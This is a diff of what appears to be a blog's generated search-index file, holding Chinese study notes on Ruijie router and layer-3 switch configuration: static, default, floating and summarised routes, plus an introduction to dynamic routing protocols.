+<li>配置了多条浮动路由，只有可信度最高（管理距离最小）的一条浮动路由会被添加到路由表中</li>
+<li>当可信度最高的浮动路由失效后，可信度次高的浮动会被添加到路由表中</li>
+<li>在R1和R3上配置浮动路由，使得正常状态路径为：Net1-R1-R2-R3-Net2 </li>
+<li>断开R1与R2、R3与R2的连接后，路径切换为：Net1-R1-R3-Net2</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.2 10
+R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.10 100
+R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.5 10
+R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.9 100</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104243.png" alt="18" loading="lazy"></p>
+<h3 id="静态路由配置案例3-——-查看浮动静态路由"><a href="#静态路由配置案例3-——-查看浮动静态路由" class="headerlink" title="静态路由配置案例3 —— 查看浮动静态路由"></a>静态路由配置案例3 —— 查看浮动静态路由</h3><ul>
+<li>配置完成后查看R1和R3的路由表</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1#show ip route
+C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2 
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S 192.168.2.0 &#x2F;24 [10&#x2F;0] via 172.16.1.2 </code></pre>
+
+<pre class="language-none"><code class="language-none">R3#show ip route
+C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
+C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5 
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S 192.168.1.0 &#x2F;24 [10&#x2F;0] via 172.16.1.5 </code></pre>
+
+<ul>
+<li>断开R1与R2、R3与R2的连接后，查看R1和R3的路由表</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1#show ip route
+C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S 192.168.2.0 &#x2F;24 [100&#x2F;0] via 172.16.1.10 </code></pre>
+
+<pre class="language-none"><code class="language-none">R3#show ip route
+C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S 192.168.1.0 &#x2F;24 [100&#x2F;0] via 172.16.1.9</code></pre>
+
+<h3 id="静态路由配置案例4-——-三层交换机上配置静态路由"><a href="#静态路由配置案例4-——-三层交换机上配置静态路由" class="headerlink" title="静态路由配置案例4 —— 三层交换机上配置静态路由"></a>静态路由配置案例4 —— 三层交换机上配置静态路由</h3><ul>
+<li>三层交换机也有路由功能，可实现不同VLAN间通信 </li>
+<li>在两个三层交换机上的SVI(switch virtual interface)口配置IP作为三层接口</li>
+<li>三层交换机之间的互联：（方案1）可以选择用trunk （方案2）也可以选择用三层路由接口</li>
+<li>在两台三层交换机上配置静态路由</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104249.png" alt="19" loading="lazy"></p>
+<ul>
+<li>SW1、SW2的SVI与静态路由配置 <ul>
+<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口</li>
+<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关 </li>
+<li>（方案1）VLAN 800的SVI地址可以作为SW1与SW2直连通信的路由地址 </li>
+<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">SW1(config)#vlan 800
+SW1(config)#interface vlan 10
+SW1(config-if)#ip address 192.168.1.254 255.255.255.0
+SW1(config)#interface vlan 20
+SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
+SW1(config)#interface vlan 800
+SW1(config-if)#ip address 10.0.0.1 255.255.255.252
+SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
+SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
+
+<pre class="language-none"><code class="language-none">SW2(config)#vlan 800
+SW2(config)#interface vlan 30
+SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
+SW2(config)#interface vlan 40
+SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
+SW2(config)#interface vlan 800
+SW2(config-if)#ip address 10.0.0.2 255.255.255.252
+SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
+SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
+
+<ul>
+<li>SW1、SW2的SVI与静态路由配置 <ul>
+<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口 </li>
+<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关</li>
+<li>（方案2）SW1与SW2的G0&#x2F;5接口可以转化为三层路由接口，作为互联地址 </li>
+<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">SW1(config)#interface vlan 10
+SW1(config-if)#ip address 192.168.1.254 255.255.255.0
+SW1(config)#interface vlan 20
+SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
+SW1(config)#interface GigabitEthernet 0&#x2F;5
+SW1(config-if)#no switchport
+SW1(config-if)# ip address 10.0.0.1 255.255.255.252
+SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
+SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
+
+<pre class="language-none"><code class="language-none">SW2(config)#interface vlan 30
+SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
+SW2(config)#interface vlan 40
+SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
+SW2(config)#interface GigabitEthernet 0&#x2F;5
+SW2(config-if)#no switchport
+SW2(config-if)# ip address 10.0.0.2 255.255.255.252
+SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
+SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
+
+<h3 id="静态路由配置案例4-——-三层交换机上配置静态路由-1"><a href="#静态路由配置案例4-——-三层交换机上配置静态路由-1" class="headerlink" title="静态路由配置案例4 —— 三层交换机上配置静态路由"></a>静态路由配置案例4 —— 三层交换机上配置静态路由</h3><ul>
+<li>SW1、SW2的SVI与静态路由配置 <ul>
+<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口 </li>
+<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关 </li>
+<li>（方案2）SW1与SW2的G0&#x2F;5接口可以转化为三层路由接口，作为互联地址 </li>
+<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">SW1(config)#interface vlan 10
+SW1(config-if)#ip address 192.168.1.254 255.255.255.0
+SW1(config)#interface vlan 20
+SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
+SW1(config)#interface GigabitEthernet 0&#x2F;5
+SW1(config-if)#no switchport
+SW1(config-if)# ip address 10.0.0.1 255.255.255.252
+SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
+SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
+
+<pre class="language-none"><code class="language-none">SW2(config)#interface vlan 30
+SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
+SW2(config)#interface vlan 40
+SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
+SW2(config)#interface GigabitEthernet 0&#x2F;5
+SW2(config-if)#no switchport
+SW2(config-if)# ip address 10.0.0.2 255.255.255.252
+SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
+SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
+
+<h3 id="静态路由配置案例5-——-汇总路由"><a href="#静态路由配置案例5-——-汇总路由" class="headerlink" title="静态路由配置案例5 —— 汇总路由"></a>静态路由配置案例5 —— 汇总路由</h3><ul>
+<li>路由汇总的定义：把多条路由条目汇总成一条路由条目。</li>
+<li>路由汇总的作用：收缩路由表，减轻路由器的负担，提高路由器的转发效率 </li>
+<li>分别在R1和R2上仅配置一条静态路由（不能使用默认路由），使所有PC能互相通信</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104258.png" alt="20" loading="lazy"></p>
+<ul>
+<li>配置R1路由器</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104303.png" alt="21" loading="lazy"></p>
+<h4 id="静态路由配置案例5-——-路由汇总的限制"><a href="#静态路由配置案例5-——-路由汇总的限制" class="headerlink" title="静态路由配置案例5 —— 路由汇总的限制"></a>静态路由配置案例5 —— 路由汇总的限制</h4><ul>
+<li>在特定场景下，才可实施路由汇总</li>
+<li>在以下的场景中，在R2上不能做路由汇总</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104308.png" alt="22" loading="lazy"></p>
+<h2 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h2><h3 id="动态路由协议"><a href="#动态路由协议" class="headerlink" title="动态路由协议"></a>动态路由协议</h3><ul>
+<li>目前网络项目中的主流路由协议有：RIP、OSPF、BGP</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104312.png" alt="23" loading="lazy"></p>
+<ul>
+<li>这是路由器用来计算、维护网络路由信息的协议，通常有一定的算法，工作在传输层或应用层 <ul>
+<li>RIP基于UDP，端口号520 </li>
+<li>OSPF基于IP，协议号89 </li>
+<li>BGP基于TCP，端口号179</li>
+</ul>
+</li>
+<li>路由协议工作机制的四个主要步骤： <ul>
+<li>邻居发现：路由器通过发送广播或组播报文的方式发现网络中的邻居，并基于特定参数来建立邻居关系。 </li>
+<li>路由交换：每台路由器将自己已知的路由相关信息发给相邻路由器。 </li>
+<li>路由计算：每台路由器运行某种算法，计算出最终的路由表。</li>
+<li>路由维护：路由器之间通过周期性地发送协议报文来维护邻居信息。</li>
+</ul>
+</li>
+</ul>
+<h3 id="动态路由基本概念"><a href="#动态路由基本概念" class="headerlink" title="动态路由基本概念"></a>动态路由基本概念</h3><ul>
+<li>衡量路由协议的主要指标 <ul>
+<li>协议计算的正确性：协议使用的算法能够计算出最优的路由，且正确无自环。 </li>
+<li>路由收敛速度：当网络的拓扑结构发生变化之后，能够迅速感知并及时更新相应的路由信息。 </li>
+<li>协议占用系统开销：协议自身占用的资源开销（内存、CPU、网络带宽)。</li>
+<li>协议自身的安全性：协议自身不易受攻击，有安全机制。 </li>
+<li>协议适用网络规模：协议可以应用在何种拓扑结构和规模的网络中。</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104316.png" alt="24" loading="lazy"></p>
+<h3 id="动态路由协议的分类"><a href="#动态路由协议的分类" class="headerlink" title="动态路由协议的分类"></a>动态路由协议的分类</h3><ul>
+<li>按照管理范围分类 <ul>
+<li>IGP（内部网关协议）：RIP、EIGRP、OSPF、IS-IS（园区网常用协议） </li>
+<li>EGP（外部网关协议）：BGP（主要应用在金融，政府电子政务网，运营商网络）</li>
+</ul>
+</li>
+<li>按照算法分类 <ul>
+<li>距离矢量路由协议：RIP、BGP </li>
+<li>链路状态路由协议：OSPF、IS-IS</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104320.png" alt="25" loading="lazy"></p>
+<h3 id="距离矢量路由协议"><a href="#距离矢量路由协议" class="headerlink" title="距离矢量路由协议"></a>距离矢量路由协议</h3><ul>
+<li>路由以矢量（距离、方向）的方式通告出去</li>
+<li>距离矢量协议直接传送各自的路由表信息 <ul>
+<li>每台路由器从邻居路由器直接获取路由信息，并将这些路由信息连同自己的本地路由信息发送给其他邻居</li>
+<li>如此逐跳传递，达到全网同步。每个路由器都不了解整个网络拓扑 </li>
+<li>它们只知道与自己直接相连的网络情况，并根据从邻居得到的路由信息更新自己的路由</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104350.png" alt="26" loading="lazy"></p>
+<h3 id="链路状态路由协议"><a href="#链路状态路由协议" class="headerlink" title="链路状态路由协议"></a>链路状态路由协议</h3><ul>
+<li>基于Dijkstra（迪克斯特拉）算法的最短路径优先（SPF）算法，比距离矢量路由协议复杂 </li>
+<li>路由器并不向邻居直接传递“路由表项”，而是通告给邻居链路状态 </li>
+<li>链路状态信息包括：接口IP地址和掩码、网络类型、链路开销、链路上所有相邻路由器</li>
+<li>运行该路由协议的路由器不是简单地从相邻的路由器学习路由，而是把路由器分成区域，收集区域的所有 的路由器的链路状态信息，根据状态信息和SPF算法生成网络拓扑结构，每一个路由器再根据拓扑结构计 算出路由</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104354.png" alt="27" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>锐捷</category>
+      </categories>
+      <tags>
+        <tag>锐捷</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>胖瘦AP组网方案</title>
     <url>/posts/82dddbd2/</url>
     <content><![CDATA[<div class="danger">
@@ -9693,390 +10314,6 @@ dc0c.5cd6.60b3 10.0.0.2 0074.9c5a.f76c&#x2F;2 10 10 192.0M&#x2F;D&#x2F;ac WPA2_P
 <li>集中转发：数据流通过AC，并且由AC解封装CAPWAP协议； </li>
 <li>本地转发：数据流不通过AC，没有CAPWAP数据隧道；</li>
 </ul>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>锐捷</category>
-      </categories>
-      <tags>
-        <tag>锐捷</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>路由技术介绍</title>
-    <url>/posts/f2727247/</url>
-    <content><![CDATA[<div class="danger">
-
-<blockquote>
-<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
-</blockquote>
-</div>
-
-<h2 id="路由技术介绍"><a href="#路由技术介绍" class="headerlink" title="路由技术介绍"></a>路由技术介绍</h2><h3 id="为什么需要路由"><a href="#为什么需要路由" class="headerlink" title="为什么需要路由"></a>为什么需要路由</h3><ul>
-<li>PC的网卡在进行发送数据的时候，网络层将检查目的IP与本网卡的IP地址是否处于一个网段<ul>
-<li>如果属于一个网段，则直接用ARP解析目的IP的MAC地址 </li>
-<li>如果不属于一个网段，则用ARP解析网关的MAC地址</li>
-</ul>
-</li>
-<li>二层交换网络（同一广播域&#x2F;VLAN）内，不同网段的主机之间无法直接通信</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104121.png" alt="1" loading="lazy"></p>
-<h3 id="路由的定义"><a href="#路由的定义" class="headerlink" title="路由的定义"></a>路由的定义</h3><ul>
-<li>从一个接口上收到数据包，根据数据包的目的地址进行定向和转发的过程 </li>
-<li>路由器依据路由表选择下一跳地址&#x2F;出接口并转发数据，实现跨IP网段通信</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104128.png" alt="2" loading="lazy"></p>
-<h4 id="直接路由数据通信分析"><a href="#直接路由数据通信分析" class="headerlink" title="直接路由数据通信分析"></a>直接路由数据通信分析</h4><ul>
-<li>直接路由：同一个IP网络内的通信 </li>
-<li>回想一下：同一个LAN中的PC1和PC2之间的通信过程：PC1&gt;ping 192.168.1.200</li>
-</ul>
-<ol>
-<li>PC1封装一个负载为ICMP Echo的IP报文：源IP&#x3D;192.168.1.100 目的IP&#x3D;192.168.1.200 </li>
-<li>PC1将IP报文封装到以太网帧中，源MAC为本地网卡的MAC，需要确定目的地的MAC </li>
-<li>PC1先判断目标IP是否处于本地子网，结果发现“是” 方式：本地IP与本地掩码是否等于目标IP与本地掩码，如果结果相等，则说明目标IP处于本地子网 </li>
-<li>查本地ARP缓存是否存在目标IP（PC2）对 应的MAC，如果不存在，则通过ARP获取</li>
-<li>成功封装以太网帧，源MAC为PC1的MAC， 目标MAC为PC2的MAC，从PC1网卡发出</li>
-<li>交换机根据MAC地址表转发以太网帧。</li>
-<li>PC2收到以太网帧，解封装出ICMP Echo 需要回复ICMP Reply的IP报文 源IP&#x3D;192.168.1.200 目的IP&#x3D;192.168.1.100</li>
-<li>PC2重复②-⑤的处理流程</li>
-</ol>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104133.png" alt="3" loading="lazy"></p>
-<h3 id="间接路由数据通信分析"><a href="#间接路由数据通信分析" class="headerlink" title="间接路由数据通信分析"></a>间接路由数据通信分析</h3><ul>
-<li>间接路由：不同IP网络内的通信 </li>
-<li>再思考一下：如果PC2与其他LAN中的PC3通信，又该如何：PC2&gt;ping 192.168.2.100</li>
-</ul>
-<p>1、PC2封装一个负载为ICMP Echo的IP报文：源IP&#x3D;192.168.1.200 目的IP&#x3D;192.168.2.100</p>
-<p>2、将IP报文封装到以太网帧中，源MAC为本地网卡的MAC，需要确定目的地的MAC</p>
-<p>3、PC2先判断目标IP是否处于本地子网，结果发现“不是” </p>
-<p>4、PC2如果配置了默认网关，查本地ARP缓存是 否存在网关IP对应的MAC，如果不存在，则通过 ARP获取ARP表项</p>
-<p>5、成功封装以太网帧，源MAC为PC2的MAC， 目标MAC为网关的MAC。由网卡接口发出</p>
-<p>6、交换机根据MAC地址表转发以太网帧，将会发送给网关</p>
-<p>7、网关路由器收到以太网帧，解封装出IP报文。根据报文中的目 标IP信息寻找出接口，在出接口重新封装以太网帧，再发出</p>
-<p>8、PC3收到以太网帧，解封装出ICMP Echo，需要回复ICMP  Reply，源IP&#x3D;192.168.2.100 目的IP&#x3D;192.168.1.200</p>
-<p>8、PC3收到以太网帧，解封装出ICMP Echo，需要回复ICMP  Reply，源IP&#x3D;192.168.2.100 目的IP&#x3D;192.168.1.200</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104140.png" alt="4" loading="lazy"></p>
-<h3 id="认识路由设备"><a href="#认识路由设备" class="headerlink" title="认识路由设备"></a>认识路由设备</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104144.png" alt="5" loading="lazy"></p>
-<h3 id="路由的下一跳"><a href="#路由的下一跳" class="headerlink" title="路由的下一跳"></a>路由的下一跳</h3><ul>
-<li>路由设备进行路由转发，下一台设备的端口IP地址 </li>
-<li>下一跳地址由路由表决定，PC客户端的默认下一跳地址通常称为“网关” <ul>
-<li>如图，PC2想要与PC3通信</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104149.png" alt="6" loading="lazy"></p>
-<ul>
-<li>下一跳地址是路由设备根据路由表选择的最佳路径 <ul>
-<li>如图，PC2想要与PC3通信</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104153.png" alt="7" loading="lazy"></p>
-<h3 id="路由表的构成与维护"><a href="#路由表的构成与维护" class="headerlink" title="路由表的构成与维护"></a>路由表的构成与维护</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104158.png" alt="8" loading="lazy"></p>
-<h3 id="路由表的构成"><a href="#路由表的构成" class="headerlink" title="路由表的构成"></a>路由表的构成</h3><p>路由表是路由器转发数据报文的判断依据。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104202.png" alt="9" loading="lazy"></p>
-<h4 id="路由表的度量值"><a href="#路由表的度量值" class="headerlink" title="路由表的度量值"></a>路由表的度量值</h4><ul>
-<li>度量值（Metric）：路由协议用来衡量路径优劣的参数。表示到达目的地的代价总和</li>
-<li>影响度量值的因素：线路带宽、跳数、线路延迟·、线路使用率、线路可信度等</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104207.png" alt="10" loading="lazy"></p>
-<h3 id="路由表的内容"><a href="#路由表的内容" class="headerlink" title="路由表的内容"></a>路由表的内容</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104210.png" alt="11" loading="lazy"></p>
-<h3 id="管理距离"><a href="#管理距离" class="headerlink" title="管理距离"></a>管理距离</h3><ul>
-<li>管理距离（Administrative Distance），也叫优先级，用来衡量路由源的可信度 </li>
-<li>管理距离值越低，可信度越高。只有可信度最高的路由会被添加进路由表</li>
-<li>管理距离默认值由厂商自定义</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104214.png" alt="12" loading="lazy"></p>
-<h3 id="路由加表原则"><a href="#路由加表原则" class="headerlink" title="路由加表原则"></a>路由加表原则</h3><p>只有最佳路径才会被添加进路由表中，形成路由条目</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104217.png" alt="13" loading="lazy"></p>
-<h3 id="路由选路原则-——-最长子网掩码匹配原则"><a href="#路由选路原则-——-最长子网掩码匹配原则" class="headerlink" title="路由选路原则 —— 最长子网掩码匹配原则"></a>路由选路原则 —— 最长子网掩码匹配原则</h3><ul>
-<li><p>路由设备基于数据包的目的IP地址，按照最长子网掩码匹配原则查找路由表 </p>
-</li>
-<li><p>根据查询结果转发。查询无果则丢弃数据包</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104223.png" alt="14" loading="lazy"></p>
-</li>
-</ul>
-<h2 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h2><h3 id="静态路由-1"><a href="#静态路由-1" class="headerlink" title="静态路由"></a>静态路由</h3><ul>
-<li>由网络管理员手工配置的路由信息，当网络拓扑发生变化时，管理员需要手工修改静态路由信息 </li>
-<li>静态路由信息是本地有效的，不会传递给其他的路由器 </li>
-<li>静态路由一般适用于比较简单的网络环境，大型和复杂的网络环境通常不宜采用静态路由 使用静态路由好处是网络安全保密性高 </li>
-<li>使用全局配置命令ip route，配置静态路由 <ul>
-<li>下一跳地址必须是直连网络上可达的地址 </li>
-<li>点对点连接时，下一跳地址可用出接口代替</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104229.png" alt="15" loading="lazy"></p>
-<h3 id="静态路由配置案例1-——-基础配置"><a href="#静态路由配置案例1-——-基础配置" class="headerlink" title="静态路由配置案例1 —— 基础配置"></a>静态路由配置案例1 —— 基础配置</h3><ul>
-<li>在3台路由器上配置静态路由，使Net 1与Net 2能互相通信 <ul>
-<li>选择100M链路，路径为：Net1-R1-R2-R3-Net2</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.2
-R2(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.1
-R2(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.6
-R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.5</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104233.png" alt="16" loading="lazy"></p>
-<h3 id="静态路由配置案例1-——-查看静态路由"><a href="#静态路由配置案例1-——-查看静态路由" class="headerlink" title="静态路由配置案例1 —— 查看静态路由"></a>静态路由配置案例1 —— 查看静态路由</h3><ul>
-<li>在特权用户模式显示IP路由表<ul>
-<li>ruijie#show ip route</li>
-</ul>
-</li>
-<li>查看R1、R2和R3的路由表</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1#show ip route
-C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1 
-S 192.168.2.0&#x2F;24 [1&#x2F;0] via 172.16.1.2</code></pre>
-
-<pre class="language-none"><code class="language-none">R2#show ip route
-C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2 
-C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
-S 192.168.1.0&#x2F;24 [1&#x2F;0] via 172.16.1.1
-S 192.168.2.0&#x2F;24 [1&#x2F;0] via 172.16.1.6</code></pre>
-
-<pre class="language-none"><code class="language-none">R3#show ip route
-C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
-C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S 192.168.1.0&#x2F;24 [1&#x2F;0] via 172.16.1.5</code></pre>
-
-
-
-<h3 id="静态路由配置案例2-——-默认路由"><a href="#静态路由配置案例2-——-默认路由" class="headerlink" title="静态路由配置案例2 —— 默认路由"></a>静态路由配置案例2 —— 默认路由</h3><ul>
-<li>默认静态路由是特殊的静态路由，它的目标网络和子网掩码均为0.0.0.0（默认路由有可能是动态路由）</li>
-<li>在R1和R3上配置默认路由，使R1与R3的100M链路故障时，可以使用10M链路</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1(config)#ip route 0.0.0.0 0.0.0.0 172.16.1.10
-R3(config)#ip route 0.0.0.0 0.0.0.0 172.16.1.9</code></pre>
-
-<pre class="language-none"><code class="language-none">R1#show ip route
-C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5 
-C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S* 0.0.0.0&#x2F;0 [1&#x2F;0] via 172.16.1.10</code></pre>
-
-<pre class="language-none"><code class="language-none">R3#show ip route
-C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
-C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1 
-S* 0.0.0.0&#x2F;0 [1&#x2F;0] via 172.16.1.9</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104239.png" alt="17" loading="lazy"></p>
-<h3 id="静态路由配置案例3-——-浮动静态路由"><a href="#静态路由配置案例3-——-浮动静态路由" class="headerlink" title="静态路由配置案例3 —— 浮动静态路由"></a>静态路由配置案例3 —— 浮动静态路由</h3><ul>
-<li>浮动路由就是在静态路由的基础上，加上管理距离参数，管理距离越小，可信度越高 </li>
-<li>配置了多条浮动路由，只有可信度最高（管理距离最小）的一条浮动路由会被添加到路由表中</li>
-<li>当可信度最高的浮动路由失效后，可信度次高的浮动会被添加到路由表中</li>
-<li>在R1和R3上配置浮动路由，使得正常状态路径为：Net1-R1-R2-R3-Net2 </li>
-<li>断开R1与R2、R3与R2的连接后，路径切换为：Net1-R1-R3-Net2</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.2 10
-R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.10 100
-R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.5 10
-R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.9 100</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104243.png" alt="18" loading="lazy"></p>
-<h3 id="静态路由配置案例3-——-查看浮动静态路由"><a href="#静态路由配置案例3-——-查看浮动静态路由" class="headerlink" title="静态路由配置案例3 —— 查看浮动静态路由"></a>静态路由配置案例3 —— 查看浮动静态路由</h3><ul>
-<li>配置完成后查看R1和R3的路由表</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1#show ip route
-C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2 
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S 192.168.2.0 &#x2F;24 [10&#x2F;0] via 172.16.1.2 </code></pre>
-
-<pre class="language-none"><code class="language-none">R3#show ip route
-C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
-C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5 
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S 192.168.1.0 &#x2F;24 [10&#x2F;0] via 172.16.1.5 </code></pre>
-
-<ul>
-<li>断开R1与R2、R3与R2的连接后，查看R1和R3的路由表</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1#show ip route
-C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S 192.168.2.0 &#x2F;24 [100&#x2F;0] via 172.16.1.10 </code></pre>
-
-<pre class="language-none"><code class="language-none">R3#show ip route
